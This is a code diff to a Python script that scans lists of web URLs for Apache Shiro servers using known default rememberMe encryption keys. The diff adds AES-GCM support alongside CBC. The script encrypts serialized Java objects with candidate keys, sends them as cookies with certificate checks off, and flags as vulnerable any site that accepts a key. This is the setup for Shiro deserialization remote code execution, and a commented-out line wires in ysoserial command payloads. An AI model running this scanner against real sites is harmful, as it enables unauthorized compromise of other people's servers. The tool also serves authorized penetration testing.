@@ -16,6 +16,7 @@ import requests
 warnings.filterwarnings("ignore")
 JAR_FILE = './ysoserial-0.0.8-SNAPSHOT-all.jar'
 bin_payload = b'\xac\xed\x00\x05sr\x002org.apache.shiro.subject.SimplePrincipalCollection\xa8\x7fX%\xc6\xa3\x08J\x03\x00\x01L\x00\x0frealmPrincipalst\x00\x0fLjava/util/Map;xppw\x01\x00x'
+check ="rO0ABXNyADJvcmcuYXBhY2hlLnNoaXJvLnN1YmplY3QuU2ltcGxlUHJpbmNpcGFsQ29sbGVjdGlvbqh/WCXGowhKAwABTAAPcmVhbG1QcmluY2lwYWxzdAAPTGphdmEvdXRpbC9NYXA7eHBzcgAXamF2YS51dGlsLkxpbmtlZEhhc2hNYXA0wE5cEGzA+wIAAVoAC2FjY2Vzc09yZGVyeHIAEWphdmEudXRpbC5IYXNoTWFwBQfawcMWYNEDAAJGAApsb2FkRmFjdG9ySQAJdGhyZXNob2xkeHA/QAAAAAAADHcIAAAAEAAAAAF0AAhpbmlSZWFsbXNyABdqYXZhLnV0aWwuTGlua2VkSGFzaFNldNhs11qV3SoeAgAAeHIAEWphdmEudXRpbC5IYXNoU2V0ukSFlZa4tzQDAAB4cHcMAAAAED9AAAAAAAABdAAFYWRtaW54eAB3AQFxAH4ABXg="
 scan_count = 0
 vuln_count = 0
 success = []
@@ -29,6 +30,20 @@ def poc(url, rce_command,key_):
     try:
         #payload = generator(rce_command, JAR_FILE,key_) # 生成payload
         payload = generator2(key_ , bin_payload)
+        r = requests.get(target, cookies={'rememberMe': payload.decode()}, timeout=10,verify=False)  # 发送验证请求
+        headers = r.headers.get('Set-Cookie', '')
+    except Exception, e:
+        return "Error"
+    return headers
+
+def poc_(url, rce_command,key_):
+    if '://' not in url:
+        target = 'https://%s' % url if ':443' in url else 'http://%s' % url
+    else:
+        target = url
+    try:
+        #payload = generator(rce_command, JAR_FILE,key_) # 生成payload
+        payload = generator2_(key_ , check)
         r = requests.get(target, cookies={'rememberMe': payload.decode()}, timeout=10,verify=False)  # 发送验证请求
         headers = r.headers.get('Set-Cookie', '')
     except Exception, e:
@@ -59,6 +74,16 @@ def generator2(key, bb):
     encryptor = AES.new(base64.b64decode(key), mode, iv)
     file_body = pad(bb)
     base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))
+    return base64_ciphertext
+
+def generator2_(key,bb):
+    BS = AES.block_size
+    mode = AES.MODE_GCM
+    iv = uuid.uuid4().bytes
+    encryptor = AES.new(base64.b64decode(key), mode, iv)
+    file_body = base64.b64decode(bb)
+    enc,tag = encryptor.encrypt_and_digest(file_body)
+    base64_ciphertext = base64.b64encode(iv + enc + tag)
     return base64_ciphertext
 
 def detect(url_list):
@@ -195,17 +220,30 @@ def check_vuln():
         except:
             break
         try:
-            for key_ in key:
-                #random_str_ = random_str(8)
-                connect = poc(web_url,"",key_)
-                print "[+] Trying url:%s , key:%s. " % (web_url,key_)
-                #result = getrecord()
-                if connect != "Error":
-                    if 'rememberMe=deleteMe' not in connect:
-                        print "[+200] vuln apache shiro",web_url,key_
-                        success.append((web_url,key_))
-                        vuln_count+=1
-                        break
+            if version == '1':
+                for key_ in key:
+                    #random_str_ = random_str(8)
+                    connect = poc(web_url,"",key_)
+                    print "[+] Trying url:%s , key:%s. " % (web_url,key_)
+                    #result = getrecord()
+                    if connect != "Error":
+                        if 'rememberMe=deleteMe' not in connect:
+                            print "[+200] vuln apache shiro",web_url,key_,version
+                            success.append((web_url,key_,"AES.MODE_CBC"))
+                            vuln_count+=1
+                            break
+            elif version == '2':
+                for key_ in key:
+                    #random_str_ = random_str(8)
+                    connect = poc_(web_url,"",key_)
+                    print "[+] Trying url:%s , key:%s. " % (web_url,key_)
+                    #result = getrecord()
+                    if connect != "Error":
+                        if 'rememberMe=deleteMe' not in connect:
+                            print "[+200] vuln apache shiro",web_url,key_,version
+                            success.append((web_url,key_,"AES.MODE_GCM"))
+                            vuln_count+=1
+                            break
         except Exception,e:
             pass
 
@@ -213,12 +251,16 @@ if __name__ == '__main__':
     parser = argparse.ArgumentParser(formatter_class=argparse.RawTextHelpFormatter,
                                     description='Shiro_Alive_keys_scan',
                                     usage='Shiro_Alives_keys_scan.py [optional]')
-    parser.add_argument('-f',metavar='File',type=str,default='url.txt',help='Put Web url in url.txt')
+    parser.add_argument('-f',metavar='File',type=str,default='urls.txt',help='Put Web url in url.txt')
+    parser.add_argument('-v',metavar='Version',type=str,default='1',help='Input Shiro Key Version')
     parser.add_argument('-u',metavar='Url',type=str,help='Put a Web url')
     parser.add_argument('-t',metavar='THREADS',type=int,default='10',help='Num of scan threads,default 10')
     if len(sys.argv)==1:
         sys.argv.append('-h')
     args = parser.parse_args()
+
+    global version
+    version = args.v
 
     start_time = time.time()
     detect_web_url = []
@@ -255,7 +297,7 @@ if __name__ == '__main__':
         check_vuln()
     print "--------------------------- Result ----------------------------"
     print ('[*] Done. %s weburl scanned %s available %.1f seconds.' % (scan_count,vuln_count,time.time() - start_time))
+    print "--------------------------- Vuln Shiro Url , keys ----------------------------"
     for success_list in success:
-        print "--------------------------- Vuln Shiro Url , keys ----------------------------"
-        print "[*] Vuln urls:%s, key:%s." % (success_list[0],success_list[1])
+        print "[*] Vuln urls:%s, key:%s, version:%s." % (success_list[0],success_list[1],success_list[2])
 
